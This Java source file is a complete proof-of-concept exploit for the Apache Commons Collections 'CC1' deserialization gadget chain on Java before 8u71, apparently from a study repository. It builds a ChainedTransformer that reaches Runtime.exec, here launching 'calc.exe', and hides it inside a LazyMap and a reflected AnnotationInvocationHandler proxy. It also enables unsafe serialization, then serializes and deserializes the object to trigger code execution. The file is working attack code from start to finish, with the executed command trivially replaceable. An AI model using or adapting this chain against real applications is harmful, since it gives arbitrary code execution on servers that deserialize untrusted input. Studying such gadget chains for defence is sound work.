package com.SugarP1g.deserialization.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Before8u71 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{
                                String.class,
                                Class[].class
                        },
                        new Object[]{
                                "getRuntime",
                                new Class[0]
                        }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{
                                Object.class,
                                Object[].class
                        },
                        new Object[]{
                                null,
                                new Object[0]
                        }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new String[]{"calc.exe"}
                ),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,
                Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map)
                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class},
                        handler);
        handler = (InvocationHandler)
                construct.newInstance(Retention.class, proxyMap);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        oos.writeObject(handler);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
